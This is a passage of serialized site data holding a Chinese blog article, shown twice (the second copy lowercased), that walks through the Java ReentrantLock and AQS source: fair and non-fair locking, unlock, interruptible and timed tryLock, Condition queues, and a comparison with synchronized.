过程",slug:"lock-过程",normalizedTitle:"lock() 过程",charIndex:65},{level:3,title:"公平锁",slug:"公平锁",normalizedTitle:"公平锁",charIndex:80},{level:3,title:"非公平锁",slug:"非公平锁",normalizedTitle:"非公平锁",charIndex:89},{level:2,title:"unlock() 过程",slug:"unlock-过程",normalizedTitle:"unlock() 过程",charIndex:97},{level:2,title:"lockInterruptibly() 中断锁过程",slug:"lockinterruptibly-中断锁过程",normalizedTitle:"lockinterruptibly() 中断锁过程",charIndex:112},{level:2,title:"tryLock()",slug:"trylock",normalizedTitle:"trylock()",charIndex:141},{level:2,title:"tryLock(long timeout, TimeUnit unit)",slug:"trylock-long-timeout-timeunit-unit",normalizedTitle:"trylock(long timeout, timeunit unit)",charIndex:154},{level:2,title:"ReentrantLock 的等待 / 通知机制",slug:"reentrantlock-的等待-通知机制",normalizedTitle:"reentrantlock 的等待 / 通知机制",charIndex:194},{level:3,title:"newCondition()",slug:"newcondition",normalizedTitle:"newcondition()",charIndex:224},{level:2,title:"ReentrantLock 和 Synchronized 对比",slug:"reentrantlock-和-synchronized-对比",normalizedTitle:"reentrantlock 和 synchronized 对比",charIndex:242}],excerpt:"<Boxx/>\n<p>可独占，可重入，可中断，可公平可非公平。</p>\n",headersStr:"主要特性： Lock lock() 过程 公平锁 非公平锁 unlock() 过程 lockInterruptibly() 中断锁过程 tryLock() tryLock(long timeout, TimeUnit unit) ReentrantLock 的等待 / 通知机制 newCondition() ReentrantLock 和 Synchronized 对比",content:'可独占，可重入，可中断，可公平可非公平。\n\n引自掘金hahaeee和薛8糅合而来。\n\n\n\n * 主要特性：\n * Lock\n * lock() 过程\n   * 公平锁\n   * 非公平锁\n * unlock() 过程\n * lockInterruptibly() 中断锁过程\n * tryLock()\n * tryLock(long timeout, TimeUnit unit)\n * ReentrantLock 的等待 / 通知机制\n   * newCondition()\n * ReentrantLock 和 Synchronized 对比\n\n\n\n\n# 主要特性：\n\n 1. 可重入。ReentrantLock 是可重入锁，因为它会记录之前获得锁线程对象，保存在 exclusiveOwenerThread 变量中，当一个线程要获取锁时，会先判断当前线程是不是已经获取锁的线程。synchronized 也是可重入锁。\n\n 2. 可中断。ReentrantLock 是可中断锁，它提供了 lockInterruptibly 这种可中断的加锁方式，可以有效的避免线程之间因为互相持续占有资源而导致阻塞。synchronized 无法实现可中断。\n\n 3. 公平锁与非公平锁可选。ReentrantLock 默认是非公平锁，但是也可以通过构造方法选择非公平锁。公平锁是指当多个线程尝试获取同一个锁时，获取锁的顺序按照到达的时间顺序排序。\n\n\n\n\n\n斜体为抽象类,下横线为接口\n\n聚合关系总结:\n\n 1. ReentrantLock 实现了 Lock,Serializable 接口\n 2. ReentrantLock.Sync (内部类) 继承了 AQS\n 3. ReentrantLock.NonfairSync 和 ReentrantLock.FairSync 继承了 ReentrantLock.Sync\n 4. ReentrantLock 持有 ReentrantLock.Sync 对象 (实现锁功能)\n\n锁实现总结:\n\n 1. 由 Node 节点组成一条同步队列 (有 head,tail 两个指针，并且 head 初始化时指向空节点)\n 2. int state 标记锁使用数量 (独占锁时，通常为 1, 发生重入时> 1)\n 3. lock () 时加到队列尾部\n 4. unlock () 时，释放 head 节点，并指向下一个节点 head=head.next, 然后唤醒当前 head 节点\n\n性质:\n\n 1. 独占锁 (排它锁): 只能有一个线程获取锁\n 2. 重入锁：一个线程可以多次 lock ()\n 3. 公平 / 非公平锁：只针对上锁过程\n    1. 非公平锁：尝试获取锁，若成功立刻返回，失败则加入同步队列\n    2. 公平锁：直接加入同步队列\n\n\n# Lock\n\nLock 接口定义了锁的行为\n\npublic interface Lock {\n\t//上锁(不响应Thread.interrupt()直到获取锁)\n    void lock();\n\t//上锁(响应Thread.interrupt())\n    void lockInterruptibly() throws InterruptedException;\n\t//尝试获取锁(以nonFair方式获取锁)\n    boolean tryLock();\n  \t//在指定时间内尝试获取锁(响应Thread.interrupt(),支持公平/二阶段非公平)\n    boolean tryLock(long time, TimeUnit unit) throws InterruptedException;\n\t//解锁\n    void unlock();\n\t//获取Condition\n    Condition newCondition();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# lock() 过程\n\n//锁具体实现\nprivate final Sync sync;\n//根据传入参数选择FairSync或NonfairSync实现\npublic ReentrantLock(boolean fair) {\n        sync = fair ? new FairSync() : new NonfairSync();\n}\npublic void lock() {\n\tsync.lock();\n}\n#java.util.concurrent.locks.ReentrantLock.Sync\nabstract void lock();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 公平锁\n\n加入同步队列 (当同步队列为空时会直接获得锁), 等待锁\n\n#java.util.concurrent.locks.ReentrantLock.FairSync\nfinal void lock() {\n\tacquire(1);\n}\n#java.util.concurrent.locks.AbstractQueuedSynchronizer\npublic final void acquire(int arg) {\n\tif (!tryAcquire(arg) &&acquireQueued(addWaiter(Node.EXCLUSIVE), arg))\n\t\tselfInterrupt();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nacquire () 流程:\n\n 1. tryAcquire (): 模板方法，获取锁\n    \n     #java.util.concurrent.locks.ReentrantLock.FairSync\n     protected final boolean tryAcquire(int acquires) {\n     \t//获取当前线程\n        final Thread current = Thread.currentThread();\n        int c = getState();\n        if (c == 0) {//当前锁没被占用\n     \t   if (!hasQueuedPredecessors() &&//1.判断同步队列中是否有节点在等待\n     \t\t   compareAndSetState(0, acquires)) {//2.如果上面!1成立,修改state值(表明当前锁已被占用)\n     \t\t   setExclusiveOwnerThread(current);//3.如果2成立,修改当前占用锁的线程为当前线程\n     \t\t   return true;\n     \t   }\n        }\n        else if (current == getExclusiveOwnerThread()) {//占用锁线程==当前线程(重入)\n     \t   int nextc = c + acquires;//\n     \t   if (nextc < 0)\n     \t\t   throw new Error("Maximum lock count exceeded");\n     \t   setState(nextc);//修改status\n     \t   return true;\n        }\n        return false;//直接获取锁失败\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 2. acquireQueued (addWaiter (Node.EXCLUSIVE), arg): 加入同步队列\n    \n    #java.util.concurrent.locks.AbstractQueuedSynchronizer\n    //1\n    private Node addWaiter(Node mode) {\n     //生成node\n        Node node = new Node(Thread.currentThread(), mode);\n        Node pred = tail;\n        if (pred != null) {\n     \t//将node加到队列尾部\n     \t   node.prev = pred;\n     \t   if (compareAndSetTail(pred, node)) {\n     \t\t   pred.next = node;\n     \t\t   return node;\n     \t   }\n        }\n        //如果加入失败(多线程竞争或者tail指针为null)\n        enq(node);\n        return node;\n    }\n    //1.1  \n    private Node enq(final Node node) {\n     //死循环加入节点(cas会失败)\n        for (;;) {\n     \t   Node t = tail;\n     \t   if (t == null) { //tail为null,同步队列初始化\n     \t\t//设置head指针\n     \t\t   if (compareAndSetHead(new Node()))//注意这里是个空节点!!\n     \t\t\t   tail = head;//将tail也指向head\n     \t   } else {\n     \t\t   node.prev = t;//将当前node加到队尾\n     \t\t   if (compareAndSetTail(t, node)) {\n     \t\t\t   t.next = node;\n     \t\t\t   return t;//注意这里才返回\n     \t\t   }\n     \t   }\n        }\n    }\n    //2\n    final boolean acquireQueued(final Node node, int arg) {\n        boolean failed = true;\n        try {\n     \t//表示是否被打断\n     \t   boolean interrupted = false;\n     \t   for (;;) {\n     \t\t//获取node.pre节点\n     \t\t   final Node p = node.predecessor();\n     \t\t   if (p == head //当前节点是否是同步队列中的第二个节点\n     \t\t   && tryAcquire(arg)) {//获取锁,head指向当前节点\n     \t\t\t   setHead(node);//head=head.next\n     \t\t\t   p.next = null;//置空 \n     \t\t\t   failed = false;\n     \t\t\t   return interrupted;\n     \t\t   }\n    \n     \t\t   if (shouldParkAfterFailedAcquire(p, node) && //是否空转(因为空转唤醒是个耗时操作,进入空转前判断pre节点状态.如果pre节点即将释放锁,则不进入空转)\n     \t\t\t   parkAndCheckInterrupt())//利用unsafe.park()进行空转(阻塞)\n     \t\t\t   interrupted = true;//如果Thread.interrupt()被调用,(不会真的被打断,会继续循环空转直到获取到锁)\n     \t   }\n        } finally {\n     \t   if (failed)//tryAcquire()过程出现异常导致获取锁失败,则移除当前节点\n     \t\t   cancelAcquire(node);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    \n    \n    过程总结:\n    \n    1. 空转 (如果当前节点是同步队列中的第二个节点，则直接获得锁返回)\n    2. 获得锁\n    \n    > 注意，这里有两次tryAcquire()过程：\n    > 第一次，为了避免同步队列为空时还插入队列产生的性能耗费(cas空转)。\n    > 第二次，就是正常的流程，先插入队尾，然后等待唤醒，再获取锁。\n\n 3. selfInterrupt (): 唤醒当前线程\n    \n    static void selfInterrupt() {//在获取锁之后 响应intterpt()请求\n    \tThread.currentThread().interrupt();\n    }\n    \n    \n    1\n    2\n    3\n    \n\n\n# 非公平锁\n\n一阶段\n\n#java.util.concurrent.locks.ReentrantLock.NonfairSync\nfinal void lock() {\n\t//在acquire()之前先尝试获取锁\n\tif (compareAndSetState(0, 1))\n\t\tsetExclusiveOwnerThread(Thread.currentThread());\n\telse\n\t\tacquire(1);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n二阶段 acquire () 流程与公平锁一模一样，唯一区别在于 tryAcquire () 实现中\n\n#java.util.concurrent.locks.ReentrantLock.NonfairSync\nprotected final boolean tryAcquire(int acquires) {\n \treturn nonfairTryAcquire(acquires);\n }\n \n#java.util.concurrent.locks.ReentrantLock.Sync\n final boolean nonfairTryAcquire(int acquires) {//这个过程其实和FairSync.tryAcquire()基本一致\n\tfinal Thread current = Thread.currentThread();\n\tint c = getState();\n\tif (c == 0) {\n\t\t//唯一区别: 这里不会去判断队列中是否为空\n\t\tif (compareAndSetState(0, acquires)) {\n\t\t\tsetExclusiveOwnerThread(current);\n\t\t\treturn true;\n\t\t}\n\t}\n\telse if (current == getExclusiveOwnerThread()) {\n\t\tint nextc = c + acquires;\n\t\tif (nextc < 0) // overflow\n\t\t\tthrow new Error("Maximum lock count exceeded");\n\t\tsetState(nextc);\n\t\treturn true;\n\t}\n\treturn false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n区别点           LOCK () 过程 (一阶段)      TRYACQUIRE () 过程 (二阶段)\nFairSync      直接 acquire ()         当前若无线程持有锁，如果同步队列为空，获取锁\nNonFairSync   先尝试获取锁，再 acquire ()   当前若无线程持有锁，获取锁\n\n\n# unlock() 过程\n\n#java.util.concurrent.locks.ReentrantLock\npublic void unlock() {\n\tsync.release(1);\n}\n#java.util.concurrent.locks.AbstractQueuedSynchronizer\npublic final boolean release(int arg) {\nif (tryRelease(arg)) {//释放锁\n\tNode h = head;\n\tif (h != null &&//head节点为空(非公平锁直接获取锁)\n\th.waitStatus != 0)\n\t\tunparkSuccessor(h);//唤醒同步队列中离head最近的一个waitStatus<=0的节点\n\treturn true;\n}\nreturn false;\n}\n#java.util.concurrent.locks.ReentrantLock\nprotected final boolean tryRelease(int releases) {\n\tint c = getState() - releases;\n\t//持有锁的线程==当前线程\n\tif (Thread.currentThread() != getExclusiveOwnerThread())\n\t\tthrow new IllegalMonitorStateException();\n\tboolean free = false;\n\tif (c == 0) {//重入锁全部释放\n\t\tfree = true;\n\t\t//置空持有锁线程\n\t\tsetExclusiveOwnerThread(null);\n\t}\n\t//state==0(此时持有锁,不用cas)\n\tsetState(c);\n\treturn free;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# lockInterruptibly() 中断锁过程\n\nlockInterruptibly () 与 lock () 过程基本相同，区别在于 Thread.intterpt () 的应对措施不同。\n\nReentrantLock 中的 lockInterruptibly () 方法使得线程可以在被阻塞时响应中断，比如一个线程 t1 通过 lockInterruptibly() 方法获取到一个可重入锁，并执行一个长时间的任务，另一个线程通过 lockInterruptibly() 方法就可以立刻打断 t1 线程的执行，来获取 t1 持有的那个可重入锁。而通过 ReentrantLock 的 lock () 方法或者 Synchronized 持有锁的线程是不会响应其他线程的 interrupt () 方法的，直到该方法主动释放锁之后才会响应 interrupt () 方法。\n\n//lock()\nfinal boolean acquireQueued(final Node node, int arg) {\n\tboolean failed = true;\n\ttry {\n\t\t//表示是否被打断\n\t\tboolean interrupted = false;\n\t\tfor (;;) {\n\t\t\t//获取node.pre节点\n\t\t\tfinal Node p = node.predecessor();\n\t\t\tif (p == head //当前节点是否是同步队列中的第二个节点\n\t\t\t&& tryAcquire(arg)) {//获取锁,当前head指向当前节点\n\t\t\t\tsetHead(node);//head=head.next\n\t\t\t\tp.next = null;//置空 \n\t\t\t\tfailed = false;\n\t\t\t\treturn interrupted;\n\t\t\t}\n\n\t\t\tif (shouldParkAfterFailedAcquire(p, node) && //是否空转(因为空转唤醒是个耗时操作,进入空转前判断pre节点状态.如果pre节点即将释放锁,则不进入空转)\n\t\t\t\tparkAndCheckInterrupt())//利用unsafe.park()进行空转(阻塞)\n\t\t\t\tinterrupted = true;//如果Thread.interrupt()被调用,(不会真的被打断,会继续循环空转直到获取到锁)\n\t\t}\n\t} finally {\n\t\tif (failed)//tryAcquire()过程出现异常导致获取锁失败,则移除当前节点\n\t\t\tcancelAcquire(node);\n\t}\n}\n// lockInterruptibly()\nprivate void doAcquireInterruptibly(int arg)\n\tthrows InterruptedException {\n\tfinal Node node = addWaiter(Node.EXCLUSIVE);\n\tboolean failed = true;\n\ttry {\n\t\tfor (;;) {\n\t\t\tfinal Node p = node.predecessor();\n\t\t\tif (p == head && tryAcquire(arg)) {\n\t\t\t\tsetHead(node);\n\t\t\t\tp.next = null; \n\t\t\t\tfailed = false;\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif (shouldParkAfterFailedAcquire(p, node) &&\n\t\t\t\tparkAndCheckInterrupt())//唯一区别当Thread.intterpt()打断时,直接抛出异常\n\t\t\t\tthrow new InterruptedException();\n\t\t}\n\t} finally {\n\t\tif (failed)//然后移除当前节点\n\t\t\tcancelAcquire(node);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n * 中断锁代码测试：CSDN\n\n\n# tryLock()\n\n#java.util.concurrent.locks.ReentrantLock\npublic boolean tryLock() {\n\t//尝试获取非公平锁\n\treturn sync.nonfairTryAcquire(1);\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# tryLock(long timeout, TimeUnit unit)\n\n#java.util.concurrent.locks.ReentrantLock\npublic boolean tryLock(long timeout, TimeUnit unit)\n\t\tthrows InterruptedException {\n\treturn sync.tryAcquireNanos(1, unit.toNanos(timeout));\n}\n#java.util.concurrent.locks.AbstractQueuedSynchronizer\npublic final boolean tryAcquireNanos(int arg, long nanosTimeout)\n\t\tthrows InterruptedException {\n\tif (Thread.interrupted())\n\t\tthrow new InterruptedException();\n\treturn tryAcquire(arg) ||//获取锁(公平/非公平)\n\t\tdoAcquireNanos(arg, nanosTimeout);//在指定时间内等待锁(空转)\n}\n\nprivate boolean doAcquireNanos(int arg, long nanosTimeout)\n\t\tthrows InterruptedException {\n\t...\n\tfinal long deadline = System.nanoTime() + nanosTimeout;\n\t//加入队尾\n\tfinal Node node = addWaiter(Node.EXCLUSIVE);\n\tboolean failed = true;\n\ttry {\n\t\tfor (;;) {\n\t\t\tfinal Node p = node.predecessor();\n\t\t\tif (p == head && tryAcquire(arg)) {\n\t\t\t\tsetHead(node);\n\t\t\t\tp.next = null; \n\t\t\t\tfailed = false;\n\t\t\t\treturn true;\n\t\t\t}\n\t\t  //上面与acquireQueued()相同,重点看这里\n\t\t  //计算剩余时间\n\t\t\tnanosTimeout = deadline - System.nanoTime();\n\t\t\tif (nanosTimeout <= 0L)\n\t\t\t\treturn false;\n\t\t\tif (shouldParkAfterFailedAcquire(p, node) &&\n\t\t\t\tnanosTimeout > spinForTimeoutThreshold)\n\t\t\t\t//利用parkNanos()指定空转时间\n\t\t\t\tLockSupport.parkNanos(this, nanosTimeout);\n\t\t\tif (Thread.interrupted())//如果被Thread.interrupt(),则抛异常\n\t\t\t\tthrow new InterruptedException();\n\t\t}\n\t} finally {\n\t\tif (failed)//移除节点\n\t\t\tcancelAcquire(node);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# ReentrantLock 的等待 / 通知机制\n\n\n# newCondition()\n\npublic Condition newCondition() {\n\treturn sync.newCondition();\n}\n#java.util.concurrent.locks.ReentrantLock.Sync\nfinal ConditionObject newCondition() {\n\treturn new ConditionObject();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * 等待和唤醒\n\n我们知道关键字 Synchronized + Object 的 wait 和 notify、notifyAll 方法能实现等待 / 通知机制，那么 ReentrantLock 是否也能实现这样的等待 / 通知机制，答案是：可以。 ReentrantLock 通过 Condition 对象，也就是条件队列实现了和 wait、notify、notifyAll 相同的语义。 线程执行 condition.await() 方法，将节点 1 从同步队列转移到条件队列中。\n\n\n\n线程执行 condition.signal() 方法，将节点 1 从条件队列中转移到同步队列。\n\n\n\n因为只有在同步队列中的线程才能去获取锁，所以通过 Condition 对象的 wait 和 signal 方法能实现等待 / 通知机制。\n\n * 等待和唤醒部分\n\n如果想单独唤醒部分线程应该怎么做呢？这时就有必要使用多个 Condition 对象了，因为 ReentrantLock 支持创建多个 Condition 对象，例如：\n\n//为了减少篇幅 仅给出伪代码\nReentrantLock lock = new ReentrantLock();\nCondition condition = lock.newCondition();\nCondition condition1 = lock.newCondition();\n\n//线程1 调用condition.await() 线程进入到条件队列\ncondition.await();\n\n//线程2 调用condition1.await() 线程进入到条件队列\ncondition1.await();\n\n//线程32 调用condition.signal() 仅唤醒调用condition中的线程，不会影响到调用condition1。\ncondition1.await();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n这样就实现了部分唤醒的功能。\n\n\n# ReentrantLock 和 Synchronized 对比\n\n               REENTRANTLOCK   SYNCHRONIZED\n底层实现           通过 AQS 实现       通过 JVM 实现，其中 synchronized 又有多个类型的锁，除了重量级锁是通过 monitor 对象\n                               (操作系统 mutex 互斥原语) 实现外，其它类型的通过对象头实现。\n是否可重入          是               是\n公平锁            是               否\n非公平锁           是               是\n锁的类型           悲观锁、显式锁         悲观锁、隐式锁 (内置锁)\n是否支持中断         是               否\n是否支持超时等待       是               否\n是否自动获取 / 释放锁   否               是',normalizedContent:'可独占，可重入，可中断，可公平可非公平。\n\n引自掘金hahaeee和薛8糅合而来。\n\n\n\n * 主要特性：\n * lock\n * lock() 过程\n   * 公平锁\n   * 非公平锁\n * unlock() 过程\n * lockinterruptibly() 中断锁过程\n * trylock()\n * trylock(long timeout, timeunit unit)\n * reentrantlock 的等待 / 通知机制\n   * newcondition()\n * reentrantlock 和 synchronized 对比\n\n\n\n\n# 主要特性：\n\n 1. 可重入。reentrantlock 是可重入锁，因为它会记录之前获得锁线程对象，保存在 exclusiveowenerthread 变量中，当一个线程要获取锁时，会先判断当前线程是不是已经获取锁的线程。synchronized 也是可重入锁。\n\n 2. 可中断。reentrantlock 是可中断锁，它提供了 lockinterruptibly 这种可中断的加锁方式，可以有效的避免线程之间因为互相持续占有资源而导致阻塞。synchronized 无法实现可中断。\n\n 3. 公平锁与非公平锁可选。reentrantlock 默认是非公平锁，但是也可以通过构造方法选择非公平锁。公平锁是指当多个线程尝试获取同一个锁时，获取锁的顺序按照到达的时间顺序排序。\n\n\n\n\n\n斜体为抽象类,下横线为接口\n\n聚合关系总结:\n\n 1. reentrantlock 实现了 lock,serializable 接口\n 2. reentrantlock.sync (内部类) 继承了 aqs\n 3. reentrantlock.nonfairsync 和 reentrantlock.fairsync 继承了 reentrantlock.sync\n 4. reentrantlock 持有 reentrantlock.sync 对象 (实现锁功能)\n\n锁实现总结:\n\n 1. 由 node 节点组成一条同步队列 (有 head,tail 两个指针，并且 head 初始化时指向空节点)\n 2. int state 标记锁使用数量 (独占锁时，通常为 1, 发生重入时> 1)\n 3. lock () 时加到队列尾部\n 4. unlock () 时，释放 head 节点，并指向下一个节点 head=head.next, 然后唤醒当前 head 节点\n\n性质:\n\n 1. 独占锁 (排它锁): 只能有一个线程获取锁\n 2. 重入锁：一个线程可以多次 lock ()\n 3. 公平 / 非公平锁：只针对上锁过程\n    1. 非公平锁：尝试获取锁，若成功立刻返回，失败则加入同步队列\n    2. 公平锁：直接加入同步队列\n\n\n# lock\n\nlock 接口定义了锁的行为\n\npublic interface lock {\n\t//上锁(不响应thread.interrupt()直到获取锁)\n    void lock();\n\t//上锁(响应thread.interrupt())\n    void lockinterruptibly() throws interruptedexception;\n\t//尝试获取锁(以nonfair方式获取锁)\n    boolean trylock();\n  \t//在指定时间内尝试获取锁(响应thread.interrupt(),支持公平/二阶段非公平)\n    boolean trylock(long time, timeunit unit) throws interruptedexception;\n\t//解锁\n    void unlock();\n\t//获取condition\n    condition newcondition();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# lock() 过程\n\n//锁具体实现\nprivate final sync sync;\n//根据传入参数选择fairsync或nonfairsync实现\npublic reentrantlock(boolean fair) {\n        sync = fair ? new fairsync() : new nonfairsync();\n}\npublic void lock() {\n\tsync.lock();\n}\n#java.util.concurrent.locks.reentrantlock.sync\nabstract void lock();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 公平锁\n\n加入同步队列 (当同步队列为空时会直接获得锁), 等待锁\n\n#java.util.concurrent.locks.reentrantlock.fairsync\nfinal void lock() {\n\tacquire(1);\n}\n#java.util.concurrent.locks.abstractqueuedsynchronizer\npublic final void acquire(int arg) {\n\tif (!tryacquire(arg) &&acquirequeued(addwaiter(node.exclusive), arg))\n\t\tselfinterrupt();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nacquire () 流程:\n\n 1. tryacquire (): 模板方法，获取锁\n    \n     #java.util.concurrent.locks.reentrantlock.fairsync\n     protected final boolean tryacquire(int acquires) {\n     \t//获取当前线程\n        final thread current = thread.currentthread();\n        int c = getstate();\n        if (c == 0) {//当前锁没被占用\n     \t   if (!hasqueuedpredecessors() &&//1.判断同步队列中是否有节点在等待\n     \t\t   compareandsetstate(0, acquires)) {//2.如果上面!1成立,修改state值(表明当前锁已被占用)\n     \t\t   setexclusiveownerthread(current);//3.如果2成立,修改当前占用锁的线程为当前线程\n     \t\t   return true;\n     \t   }\n        }\n        else if (current == getexclusiveownerthread()) {//占用锁线程==当前线程(重入)\n     \t   int nextc = c + acquires;//\n     \t   if (nextc < 0)\n     \t\t   throw new error("maximum lock count exceeded");\n     \t   setstate(nextc);//修改status\n     \t   return true;\n        }\n        return false;//直接获取锁失败\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 2. acquirequeued (addwaiter (node.exclusive), arg): 加入同步队列\n    \n    #java.util.concurrent.locks.abstractqueuedsynchronizer\n    //1\n    private node addwaiter(node mode) {\n     //生成node\n        node node = new node(thread.currentthread(), mode);\n        node pred = tail;\n        if (pred != null) {\n     \t//将node加到队列尾部\n     \t   node.prev = pred;\n     \t   if (compareandsettail(pred, node)) {\n     \t\t   pred.next = node;\n     \t\t   return node;\n     \t   }\n        }\n        //如果加入失败(多线程竞争或者tail指针为null)\n        enq(node);\n        return node;\n    }\n    //1.1  \n    private node enq(final node node) {\n     //死循环加入节点(cas会失败)\n        for (;;) {\n     \t   node t = tail;\n     \t   if (t == null) { //tail为null,同步队列初始化\n     \t\t//设置head指针\n     \t\t   if (compareandsethead(new node()))//注意这里是个空节点!!\n     \t\t\t   tail = head;//将tail也指向head\n     \t   } else {\n     \t\t   node.prev = t;//将当前node加到队尾\n     \t\t   if (compareandsettail(t, node)) {\n     \t\t\t   t.next = node;\n     \t\t\t   return t;//注意这里才返回\n     \t\t   }\n     \t   }\n        }\n    }\n    //2\n    final boolean acquirequeued(final node node, int arg) {\n        boolean failed = true;\n        try {\n     \t//表示是否被打断\n     \t   boolean interrupted = false;\n     \t   for (;;) {\n     \t\t//获取node.pre节点\n     \t\t   final node p = node.predecessor();\n     \t\t   if (p == head //当前节点是否是同步队列中的第二个节点\n     \t\t   && tryacquire(arg)) {//获取锁,head指向当前节点\n     \t\t\t   sethead(node);//head=head.next\n     \t\t\t   p.next = null;//置空 \n     \t\t\t   failed = false;\n     \t\t\t   return interrupted;\n     \t\t   }\n    \n     \t\t   if (shouldparkafterfailedacquire(p, node) && //是否空转(因为空转唤醒是个耗时操作,进入空转前判断pre节点状态.如果pre节点即将释放锁,则不进入空转)\n     \t\t\t   parkandcheckinterrupt())//利用unsafe.park()进行空转(阻塞)\n     \t\t\t   interrupted = true;//如果thread.interrupt()被调用,(不会真的被打断,会继续循环空转直到获取到锁)\n     \t   }\n        } finally {\n     \t   if (failed)//tryacquire()过程出现异常导致获取锁失败,则移除当前节点\n     \t\t   cancelacquire(node);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    \n    \n    过程总结:\n    \n    1. 空转 (如果当前节点是同步队列中的第二个节点，则直接获得锁返回)\n    2. 获得锁\n    \n    > 注意，这里有两次tryacquire()过程：\n    > 第一次，为了避免同步队列为空时还插入队列产生的性能耗费(cas空转)。\n    > 第二次，就是正常的流程，先插入队尾，然后等待唤醒，再获取锁。\n\n 3. selfinterrupt (): 唤醒当前线程\n    \n    static void selfinterrupt() {//在获取锁之后 响应intterpt()请求\n    \tthread.currentthread().interrupt();\n    }\n    \n    \n    1\n    2\n    3\n    \n\n\n# 非公平锁\n\n一阶段\n\n#java.util.concurrent.locks.reentrantlock.nonfairsync\nfinal void lock() {\n\t//在acquire()之前先尝试获取锁\n\tif (compareandsetstate(0, 1))\n\t\tsetexclusiveownerthread(thread.currentthread());\n\telse\n\t\tacquire(1);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n二阶段 acquire () 流程与公平锁一模一样，唯一区别在于 tryacquire () 实现中\n\n#java.util.concurrent.locks.reentrantlock.nonfairsync\nprotected final boolean tryacquire(int acquires) {\n \treturn nonfairtryacquire(acquires);\n }\n \n#java.util.concurrent.locks.reentrantlock.sync\n final boolean nonfairtryacquire(int acquires) {//这个过程其实和fairsync.tryacquire()基本一致\n\tfinal thread current = thread.currentthread();\n\tint c = getstate();\n\tif (c == 0) {\n\t\t//唯一区别: 这里不会去判断队列中是否为空\n\t\tif (compareandsetstate(0, acquires)) {\n\t\t\tsetexclusiveownerthread(current);\n\t\t\treturn true;\n\t\t}\n\t}\n\telse if (current == getexclusiveownerthread()) {\n\t\tint nextc = c + acquires;\n\t\tif (nextc < 0) // overflow\n\t\t\tthrow new error("maximum lock count exceeded");\n\t\tsetstate(nextc);\n\t\treturn true;\n\t}\n\treturn false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n区别点           lock () 过程 (一阶段)      tryacquire () 过程 (二阶段)\nfairsync      直接 acquire ()         当前若无线程持有锁，如果同步队列为空，获取锁\nnonfairsync   先尝试获取锁，再 acquire ()   当前若无线程持有锁，获取锁\n\n\n# unlock() 过程\n\n#java.util.concurrent.locks.reentrantlock\npublic void unlock() {\n\tsync.release(1);\n}\n#java.util.concurrent.locks.abstractqueuedsynchronizer\npublic final boolean release(int arg) {\nif (tryrelease(arg)) {//释放锁\n\tnode h = head;\n\tif (h != null &&//head节点为空(非公平锁直接获取锁)\n\th.waitstatus != 0)\n\t\tunparksuccessor(h);//唤醒同步队列中离head最近的一个waitstatus<=0的节点\n\treturn true;\n}\nreturn false;\n}\n#java.util.concurrent.locks.reentrantlock\nprotected final boolean tryrelease(int releases) {\n\tint c = getstate() - releases;\n\t//持有锁的线程==当前线程\n\tif (thread.currentthread() != getexclusiveownerthread())\n\t\tthrow new illegalmonitorstateexception();\n\tboolean free = false;\n\tif (c == 0) {//重入锁全部释放\n\t\tfree = 